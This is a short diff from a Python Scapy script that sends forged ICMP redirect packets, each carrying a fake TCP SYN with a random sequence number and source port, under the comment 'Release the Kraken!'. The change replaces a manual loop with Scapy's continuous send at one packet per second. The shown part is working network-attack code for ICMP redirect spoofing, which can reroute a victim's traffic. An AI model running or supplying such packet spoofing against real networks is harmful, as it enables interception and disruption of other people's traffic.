@@ -94,6 +94,5 @@ fakeOriginalTCPSYN.seq = random.randrange(444444444, 555555555) # random value
 fakeOriginalTCPSYN.sport = random.randrange(40000,65535) # random port above 40000
 
 # Release the Kraken!
-while True:
-	send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)
-	sleep(1)
+print("Sending packets...")
+send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN, inter=1, loop=1)
